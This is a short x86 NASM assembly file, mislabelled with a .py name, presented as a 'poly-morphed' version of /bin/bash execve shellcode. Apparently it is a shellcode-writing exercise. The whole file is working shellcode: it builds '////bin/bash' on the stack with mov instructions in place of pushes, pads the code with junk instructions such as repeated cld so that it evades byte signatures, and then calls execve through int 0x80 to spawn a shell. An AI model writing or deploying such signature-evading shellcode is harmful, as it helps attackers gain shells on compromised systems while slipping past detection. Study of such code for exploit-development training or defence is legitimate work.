; poly_morphed.py
; Author:  Chase Hatch
; Poly-morphed  version of /bin//bash shellcode


section .text
global _start
_start:

	xor eax, eax
	xor ebx, ebx
	; push eax
	xor eax, ebx
	mov dword [esp-4], eax
	sub esp, 4	
	mov ecx, [esp]
	mov edx, [esp]
	;push 0x68736162 	;  hsab 
	;push 0x2f6e6962 	;  /nib 
	;push 0x2f2f2f2f 	;  ////	


	mov dword [esp-4], 0x68736162
	mov dword [esp-8], 0x2f6e6962
	mov dword [esp-12], 0x2f2f2f2f
	sub esp, 12
	cld
	cld
	cld
	cld
	
	
	mov al, 0xb
	mov ebx, esp
	int 0x80

	
